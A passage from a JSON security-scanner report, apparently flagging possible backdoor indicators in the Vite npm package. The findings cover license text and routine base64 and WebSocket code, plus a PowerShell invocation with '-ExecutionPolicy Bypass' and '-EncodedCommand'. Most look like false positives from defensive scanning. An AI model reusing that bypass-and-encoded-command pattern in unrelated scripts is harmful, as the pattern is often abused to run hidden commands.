                      "text": "> \n>    Licensed under the Apache License, Version 2.0 (the \"License\");\n>    you may not use this file except in compliance with the License.\n>    You may obtain a copy of the License at\n> \n>        http://www.apache.org/licenses/LICENSE-2.0\n> \n>    Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "`> \n>    Licensed under the Apache License, Version 2.0 (the \"License\");\n>    you may not use this file except in compliance with the License.\n>    You may obtain a copy of the License at\n> \n>        http://www.apache.org/licenses/LICENSE-2.0\n> \n>    Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/LICENSE.md"
                },
                "region": {
                  "startLine": 145,
                  "startColumn": 59,
                  "endLine": 145,
                  "endColumn": 63,
                  "snippet": {
                    "text": ">           distribution, then any Derivative Works that You distribute must\n>           include a readable copy of the attribution notices contained\n>           within such NOTICE file, excluding those notices that do not\n>           pertain to any part of the Derivative Works, in at least one\n>           of the following places: within a NOTICE text file distributed\n>           as part of the Derivative Works; within the Source form or\n>           documentation, if provided along with the Derivative Works; or,\n",
                    "rendered": {
                      "text": ">           distribution, then any Derivative Works that You distribute must\n>           include a readable copy of the attribution notices contained\n>           within such NOTICE file, excluding those notices that do not\n>           pertain to any part of the Derivative Works, in at least one\n>           of the following places: within a NOTICE text file distributed\n>           as part of the Derivative Works; within the Source form or\n>           documentation, if provided along with the Derivative Works; or,\n",
                      "markdown": "`>           distribution, then any Derivative Works that You distribute must\n>           include a readable copy of the attribution notices contained\n>           within such NOTICE file, excluding those notices that do not\n>           pertain to any part of the Derivative Works, in at least one\n>           of the following places: within a NOTICE text file distributed\n>           as part of the Derivative Works; within the Source form or\n>           documentation, if provided along with the Derivative Works; or,\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/LICENSE.md"
                },
                "region": {
                  "startLine": 91,
                  "startColumn": 62,
                  "endLine": 91,
                  "endColumn": 71,
                  "snippet": {
                    "text": ">       the copyright owner. For the purposes of this definition, \"submitted\"\n>       means any form of electronic, verbal, or written communication sent\n>       to the Licensor or its representatives, including but not limited to\n>       communication on electronic mailing lists, source code control systems,\n>       and issue tracking systems that are managed by, or on behalf of, the\n>       Licensor for the purpose of discussing and improving the Work, but\n>       excluding communication that is conspicuously marked or otherwise\n",
                    "rendered": {
                      "text": ">       the copyright owner. For the purposes of this definition, \"submitted\"\n>       means any form of electronic, verbal, or written communication sent\n>       to the Licensor or its representatives, including but not limited to\n>       communication on electronic mailing lists, source code control systems,\n>       and issue tracking systems that are managed by, or on behalf of, the\n>       Licensor for the purpose of discussing and improving the Work, but\n>       excluding communication that is conspicuously marked or otherwise\n",
                      "markdown": "`>       the copyright owner. For the purposes of this definition, \"submitted\"\n>       means any form of electronic, verbal, or written communication sent\n>       to the Licensor or its representatives, including but not limited to\n>       communication on electronic mailing lists, source code control systems,\n>       and issue tracking systems that are managed by, or on behalf of, the\n>       Licensor for the purpose of discussing and improving the Work, but\n>       excluding communication that is conspicuously marked or otherwise\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/LICENSE.md"
                },
                "region": {
                  "startLine": 52,
                  "startColumn": 7,
                  "endLine": 52,
                  "endColumn": 16,
                  "snippet": {
                    "text": "> \n>       \"Legal Entity\" shall mean the union of the acting entity and all\n>       other entities that control, are controlled by, or are under common\n>       control with that entity. For the purposes of this definition,\n>       \"control\" means (i) the power, direct or indirect, to cause the\n>       direction or management of such entity, whether by contract or\n>       otherwise, or (ii) ownership of fifty percent (50%) or more of the\n",
                    "rendered": {
                      "text": "> \n>       \"Legal Entity\" shall mean the union of the acting entity and all\n>       other entities that control, are controlled by, or are under common\n>       control with that entity. For the purposes of this definition,\n>       \"control\" means (i) the power, direct or indirect, to cause the\n>       direction or management of such entity, whether by contract or\n>       otherwise, or (ii) ownership of fifty percent (50%) or more of the\n",
                      "markdown": "`> \n>       \"Legal Entity\" shall mean the union of the acting entity and all\n>       other entities that control, are controlled by, or are under common\n>       control with that entity. For the purposes of this definition,\n>       \"control\" means (i) the power, direct or indirect, to cause the\n>       direction or management of such entity, whether by contract or\n>       otherwise, or (ii) ownership of fifty percent (50%) or more of the\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/LICENSE.md"
                },
                "region": {
                  "startLine": 174,
                  "startColumn": 26,
                  "endLine": 174,
                  "endColumn": 35,
                  "snippet": {
                    "text": ">       with Licensor regarding such Contributions.\n> \n>    6. Trademarks. This License does not grant permission to use the trade\n>       names, trademarks, service marks, or product names of the Licensor,\n>       except as required for reasonable and customary use in describing the\n>       origin of the Work and reproducing the content of the NOTICE file.\n> \n",
                    "rendered": {
                      "text": ">       with Licensor regarding such Contributions.\n> \n>    6. Trademarks. This License does not grant permission to use the trade\n>       names, trademarks, service marks, or product names of the Licensor,\n>       except as required for reasonable and customary use in describing the\n>       origin of the Work and reproducing the content of the NOTICE file.\n> \n",
                      "markdown": "`>       with Licensor regarding such Contributions.\n> \n>    6. Trademarks. This License does not grant permission to use the trade\n>       names, trademarks, service marks, or product names of the Licensor,\n>       except as required for reasonable and customary use in describing the\n>       origin of the Work and reproducing the content of the NOTICE file.\n> \n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 58909,
                  "startColumn": 15,
                  "endLine": 58909,
                  "endColumn": 21,
                  "snippet": {
                    "text": "\n    const digest = createHash('sha1')\n      .update(key + GUID)\n      .digest('base64');\n\n    const headers = [\n      'HTTP/1.1 101 Switching Protocols',\n",
                    "rendered": {
                      "text": "\n    const digest = createHash('sha1')\n      .update(key + GUID)\n      .digest('base64');\n\n    const headers = [\n      'HTTP/1.1 101 Switching Protocols',\n",
                      "markdown": "`\n    const digest = createHash('sha1')\n      .update(key + GUID)\n      .digest('base64');\n\n    const headers = [\n      'HTTP/1.1 101 Switching Protocols',\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 58026,
                  "startColumn": 15,
                  "endLine": 58026,
                  "endColumn": 21,
                  "snippet": {
                    "text": "\n    const digest = createHash$1('sha1')\n      .update(key + GUID$1)\n      .digest('base64');\n\n    if (res.headers['sec-websocket-accept'] !== digest) {\n      abortHandshake$1(websocket, socket, 'Invalid Sec-WebSocket-Accept header');\n",
                    "rendered": {
                      "text": "\n    const digest = createHash$1('sha1')\n      .update(key + GUID$1)\n      .digest('base64');\n\n    if (res.headers['sec-websocket-accept'] !== digest) {\n      abortHandshake$1(websocket, socket, 'Invalid Sec-WebSocket-Accept header');\n",
                      "markdown": "`\n    const digest = createHash$1('sha1')\n      .update(key + GUID$1)\n      .digest('base64');\n\n    if (res.headers['sec-websocket-accept'] !== digest) {\n      abortHandshake$1(websocket, socket, 'Invalid Sec-WebSocket-Accept header');\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 57935,
                  "startColumn": 52,
                  "endLine": 57935,
                  "endColumn": 58,
                  "snippet": {
                    "text": "    //\n    if (opts.auth && !options.headers.authorization) {\n      options.headers.authorization =\n        'Basic ' + Buffer.from(opts.auth).toString('base64');\n    }\n\n    req = websocket._req = request(opts);\n",
                    "rendered": {
                      "text": "    //\n    if (opts.auth && !options.headers.authorization) {\n      options.headers.authorization =\n        'Basic ' + Buffer.from(opts.auth).toString('base64');\n    }\n\n    req = websocket._req = request(opts);\n",
                      "markdown": "`    //\n    if (opts.auth && !options.headers.authorization) {\n      options.headers.authorization =\n        'Basic ' + Buffer.from(opts.auth).toString('base64');\n    }\n\n    req = websocket._req = request(opts);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 57815,
                  "startColumn": 40,
                  "endLine": 57815,
                  "endColumn": 46,
                  "snippet": {
                    "text": "  }\n\n  const defaultPort = isSecure ? 443 : 80;\n  const key = randomBytes(16).toString('base64');\n  const request = isSecure ? https$2.request : http$3.request;\n  const protocolSet = new Set();\n  let perMessageDeflate;\n",
                    "rendered": {
                      "text": "  }\n\n  const defaultPort = isSecure ? 443 : 80;\n  const key = randomBytes(16).toString('base64');\n  const request = isSecure ? https$2.request : http$3.request;\n  const protocolSet = new Set();\n  let perMessageDeflate;\n",
                      "markdown": "`  }\n\n  const defaultPort = isSecure ? 443 : 80;\n  const key = randomBytes(16).toString('base64');\n  const request = isSecure ? https$2.request : http$3.request;\n  const protocolSet = new Set();\n  let perMessageDeflate;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 53255,
                  "startColumn": 80,
                  "endLine": 53255,
                  "endColumn": 86,
                  "snippet": {
                    "text": "\t\t}\n\n\t\t// Using Base64-encoded command, accepted by PowerShell, to allow special characters.\n\t\toptions.target = Buffer.from(encodedArguments.join(' '), 'utf16le').toString('base64');\n\t} else {\n\t\tif (app) {\n\t\t\tcommand = app;\n",
                    "rendered": {
                      "text": "\t\t}\n\n\t\t// Using Base64-encoded command, accepted by PowerShell, to allow special characters.\n\t\toptions.target = Buffer.from(encodedArguments.join(' '), 'utf16le').toString('base64');\n\t} else {\n\t\tif (app) {\n\t\t\tcommand = app;\n",
                      "markdown": "`\t\t}\n\n\t\t// Using Base64-encoded command, accepted by PowerShell, to allow special characters.\n\t\toptions.target = Buffer.from(encodedArguments.join(' '), 'utf16le').toString('base64');\n\t} else {\n\t\tif (app) {\n\t\t\tcommand = app;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 53225,
                  "startColumn": 5,
                  "endLine": 53225,
                  "endColumn": 19,
                  "snippet": {
                    "text": "\t\t\t'-NonInteractive',\n\t\t\t'–ExecutionPolicy',\n\t\t\t'Bypass',\n\t\t\t'-EncodedCommand'\n\t\t);\n\n\t\tif (!isWsl) {\n",
                    "rendered": {
                      "text": "\t\t\t'-NonInteractive',\n\t\t\t'–ExecutionPolicy',\n\t\t\t'Bypass',\n\t\t\t'-EncodedCommand'\n\t\t);\n\n\t\tif (!isWsl) {\n",
                      "markdown": "`\t\t\t'-NonInteractive',\n\t\t\t'–ExecutionPolicy',\n\t\t\t'Bypass',\n\t\t\t'-EncodedCommand'\n\t\t);\n\n\t\tif (!isWsl) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 47737,
                  "startColumn": 36,
                  "endLine": 47737,
                  "endColumn": 42,
                  "snippet": {
                    "text": "          }` : `${encodedJs}\n          export default function WorkerWrapper(options) {\n            return new ${workerConstructor}(\n              \"data:text/javascript;base64,\" + encodedJs,\n              ${workerTypeOption}\n            );\n          }\n",
                    "rendered": {
                      "text": "          }` : `${encodedJs}\n          export default function WorkerWrapper(options) {\n            return new ${workerConstructor}(\n              \"data:text/javascript;base64,\" + encodedJs,\n              ${workerTypeOption}\n            );\n          }\n",
                      "markdown": "`          }` : `${encodedJs}\n          export default function WorkerWrapper(options) {\n            return new ${workerConstructor}(\n              \"data:text/javascript;base64,\" + encodedJs,\n              ${workerTypeOption}\n            );\n          }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 47726,
                  "startColumn": 38,
                  "endLine": 47726,
                  "endColumn": 44,
                  "snippet": {
                    "text": "              return worker;\n            } catch(e) {\n              return new ${workerConstructor}(\n                \"data:text/javascript;base64,\" + encodedJs,\n                ${workerTypeOption}\n              );\n            }${// For module workers, we should not revoke the URL until the worker runs,\n",
                    "rendered": {
                      "text": "              return worker;\n            } catch(e) {\n              return new ${workerConstructor}(\n                \"data:text/javascript;base64,\" + encodedJs,\n                ${workerTypeOption}\n              );\n            }${// For module workers, we should not revoke the URL until the worker runs,\n",
                      "markdown": "`              return worker;\n            } catch(e) {\n              return new ${workerConstructor}(\n                \"data:text/javascript;base64,\" + encodedJs,\n                ${workerTypeOption}\n              );\n            }${// For module workers, we should not revoke the URL until the worker runs,\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 47709,
                  "startColumn": 64,
                  "endLine": 47709,
                  "endColumn": 70,
                  "snippet": {
                    "text": "          const code = (\n            // Using blob URL for SharedWorker results in multiple instances of a same worker\n            workerConstructor === \"Worker\" ? `${encodedJs}\n          const decodeBase64 = (base64) => Uint8Array.from(atob(base64), c => c.charCodeAt(0));\n          const blob = typeof self !== \"undefined\" && self.Blob && new Blob([${workerType === \"classic\" ? \"\" : (\n              // `URL` is always available, in `Worker[type=\"module\"]`\n              `'URL.revokeObjectURL(import.meta.url);',`\n",
                    "rendered": {
                      "text": "          const code = (\n            // Using blob URL for SharedWorker results in multiple instances of a same worker\n            workerConstructor === \"Worker\" ? `${encodedJs}\n          const decodeBase64 = (base64) => Uint8Array.from(atob(base64), c => c.charCodeAt(0));\n          const blob = typeof self !== \"undefined\" && self.Blob && new Blob([${workerType === \"classic\" ? \"\" : (\n              // `URL` is always available, in `Worker[type=\"module\"]`\n              `'URL.revokeObjectURL(import.meta.url);',`\n",
                      "markdown": "`          const code = (\n            // Using blob URL for SharedWorker results in multiple instances of a same worker\n            workerConstructor === \"Worker\" ? `${encodedJs}\n          const decodeBase64 = (base64) => Uint8Array.from(atob(base64), c => c.charCodeAt(0));\n          const blob = typeof self !== \"undefined\" && self.Blob && new Blob([${workerType === \"classic\" ? \"\" : (\n              // `URL` is always available, in `Worker[type=\"module\"]`\n              `'URL.revokeObjectURL(import.meta.url);',`\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 47709,
                  "startColumn": 32,
                  "endLine": 47709,
                  "endColumn": 38,
                  "snippet": {
                    "text": "          const code = (\n            // Using blob URL for SharedWorker results in multiple instances of a same worker\n            workerConstructor === \"Worker\" ? `${encodedJs}\n          const decodeBase64 = (base64) => Uint8Array.from(atob(base64), c => c.charCodeAt(0));\n          const blob = typeof self !== \"undefined\" && self.Blob && new Blob([${workerType === \"classic\" ? \"\" : (\n              // `URL` is always available, in `Worker[type=\"module\"]`\n              `'URL.revokeObjectURL(import.meta.url);',`\n",
                    "rendered": {
                      "text": "          const code = (\n            // Using blob URL for SharedWorker results in multiple instances of a same worker\n            workerConstructor === \"Worker\" ? `${encodedJs}\n          const decodeBase64 = (base64) => Uint8Array.from(atob(base64), c => c.charCodeAt(0));\n          const blob = typeof self !== \"undefined\" && self.Blob && new Blob([${workerType === \"classic\" ? \"\" : (\n              // `URL` is always available, in `Worker[type=\"module\"]`\n              `'URL.revokeObjectURL(import.meta.url);',`\n",
                      "markdown": "`          const code = (\n            // Using blob URL for SharedWorker results in multiple instances of a same worker\n            workerConstructor === \"Worker\" ? `${encodedJs}\n          const decodeBase64 = (base64) => Uint8Array.from(atob(base64), c => c.charCodeAt(0));\n          const blob = typeof self !== \"undefined\" && self.Blob && new Blob([${workerType === \"classic\" ? \"\" : (\n              // `URL` is always available, in `Worker[type=\"module\"]`\n              `'URL.revokeObjectURL(import.meta.url);',`\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 47705,
                  "startColumn": 22,
                  "endLine": 47705,
                  "endColumn": 28,
                  "snippet": {
                    "text": "          const chunk = await bundleWorkerEntry(config, id);\n          const encodedJs = `const encodedJs = \"${Buffer.from(\n            chunk.code\n          ).toString(\"base64\")}\";`;\n          const code = (\n            // Using blob URL for SharedWorker results in multiple instances of a same worker\n            workerConstructor === \"Worker\" ? `${encodedJs}\n",
                    "rendered": {
                      "text": "          const chunk = await bundleWorkerEntry(config, id);\n          const encodedJs = `const encodedJs = \"${Buffer.from(\n            chunk.code\n          ).toString(\"base64\")}\";`;\n          const code = (\n            // Using blob URL for SharedWorker results in multiple instances of a same worker\n            workerConstructor === \"Worker\" ? `${encodedJs}\n",
                      "markdown": "`          const chunk = await bundleWorkerEntry(config, id);\n          const encodedJs = `const encodedJs = \"${Buffer.from(\n            chunk.code\n          ).toString(\"base64\")}\";`;\n          const code = (\n            // Using blob URL for SharedWorker results in multiple instances of a same worker\n            workerConstructor === \"Worker\" ? `${encodedJs}\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 47447,
                  "startColumn": 26,
                  "endLine": 47447,
                  "endColumn": 32,
                  "snippet": {
                    "text": "      }\n    } else {\n      throw new Error(\n        \"Failed to decode base64-encoded data URL, Buffer and atob are not supported\"\n      );\n    }\n    result = await WebAssembly.instantiate(bytes, opts);\n",
                    "rendered": {
                      "text": "      }\n    } else {\n      throw new Error(\n        \"Failed to decode base64-encoded data URL, Buffer and atob are not supported\"\n      );\n    }\n    result = await WebAssembly.instantiate(bytes, opts);\n",
                      "markdown": "`      }\n    } else {\n      throw new Error(\n        \"Failed to decode base64-encoded data URL, Buffer and atob are not supported\"\n      );\n    }\n    result = await WebAssembly.instantiate(bytes, opts);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 47438,
                  "startColumn": 39,
                  "endLine": 47438,
                  "endColumn": 45,
                  "snippet": {
                    "text": "    const urlContent = url.replace(/^data:.*?base64,/, \"\");\n    let bytes;\n    if (typeof Buffer === \"function\" && typeof Buffer.from === \"function\") {\n      bytes = Buffer.from(urlContent, \"base64\");\n    } else if (typeof atob === \"function\") {\n      const binaryString = atob(urlContent);\n      bytes = new Uint8Array(binaryString.length);\n",
                    "rendered": {
                      "text": "    const urlContent = url.replace(/^data:.*?base64,/, \"\");\n    let bytes;\n    if (typeof Buffer === \"function\" && typeof Buffer.from === \"function\") {\n      bytes = Buffer.from(urlContent, \"base64\");\n    } else if (typeof atob === \"function\") {\n      const binaryString = atob(urlContent);\n      bytes = new Uint8Array(binaryString.length);\n",
                      "markdown": "`    const urlContent = url.replace(/^data:.*?base64,/, \"\");\n    let bytes;\n    if (typeof Buffer === \"function\" && typeof Buffer.from === \"function\") {\n      bytes = Buffer.from(urlContent, \"base64\");\n    } else if (typeof atob === \"function\") {\n      const binaryString = atob(urlContent);\n      bytes = new Uint8Array(binaryString.length);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 47435,
                  "startColumn": 45,
                  "endLine": 47435,
                  "endColumn": 51,
                  "snippet": {
                    "text": "const wasmHelper = async (opts = {}, url) => {\n  let result;\n  if (url.startsWith(\"data:\")) {\n    const urlContent = url.replace(/^data:.*?base64,/, \"\");\n    let bytes;\n    if (typeof Buffer === \"function\" && typeof Buffer.from === \"function\") {\n      bytes = Buffer.from(urlContent, \"base64\");\n",
                    "rendered": {
                      "text": "const wasmHelper = async (opts = {}, url) => {\n  let result;\n  if (url.startsWith(\"data:\")) {\n    const urlContent = url.replace(/^data:.*?base64,/, \"\");\n    let bytes;\n    if (typeof Buffer === \"function\" && typeof Buffer.from === \"function\") {\n      bytes = Buffer.from(urlContent, \"base64\");\n",
                      "markdown": "`const wasmHelper = async (opts = {}, url) => {\n  let result;\n  if (url.startsWith(\"data:\")) {\n    const urlContent = url.replace(/^data:.*?base64,/, \"\");\n    let bytes;\n    if (typeof Buffer === \"function\" && typeof Buffer.from === \"function\") {\n      bytes = Buffer.from(urlContent, \"base64\");\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 45859,
                  "startColumn": 13,
                  "endLine": 45859,
                  "endColumn": 19,
                  "snippet": {
                    "text": "  var hash = crypto\n    .createHash('sha1')\n    .update(entity, 'utf8')\n    .digest('base64')\n    .substring(0, 27);\n\n  // compute length of entity\n",
                    "rendered": {
                      "text": "  var hash = crypto\n    .createHash('sha1')\n    .update(entity, 'utf8')\n    .digest('base64')\n    .substring(0, 27);\n\n  // compute length of entity\n",
                      "markdown": "`  var hash = crypto\n    .createHash('sha1')\n    .update(entity, 'utf8')\n    .digest('base64')\n    .substring(0, 27);\n\n  // compute length of entity\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 28614,
                  "startColumn": 56,
                  "endLine": 28614,
                  "endColumn": 62,
                  "snippet": {
                    "text": "            str =\n                buf instanceof Buffer\n                    ? buf.toString('base64')\n                    : Buffer.from(buf.buffer).toString('base64');\n        }\n        else if (typeof btoa === 'function') {\n            let s = '';\n",
                    "rendered": {
                      "text": "            str =\n                buf instanceof Buffer\n                    ? buf.toString('base64')\n                    : Buffer.from(buf.buffer).toString('base64');\n        }\n        else if (typeof btoa === 'function') {\n            let s = '';\n",
                      "markdown": "`            str =\n                buf instanceof Buffer\n                    ? buf.toString('base64')\n                    : Buffer.from(buf.buffer).toString('base64');\n        }\n        else if (typeof btoa === 'function') {\n            let s = '';\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 28613,
                  "startColumn": 36,
                  "endLine": 28613,
                  "endColumn": 42,
                  "snippet": {
                    "text": "        if (typeof Buffer === 'function') {\n            str =\n                buf instanceof Buffer\n                    ? buf.toString('base64')\n                    : Buffer.from(buf.buffer).toString('base64');\n        }\n        else if (typeof btoa === 'function') {\n",
                    "rendered": {
                      "text": "        if (typeof Buffer === 'function') {\n            str =\n                buf instanceof Buffer\n                    ? buf.toString('base64')\n                    : Buffer.from(buf.buffer).toString('base64');\n        }\n        else if (typeof btoa === 'function') {\n",
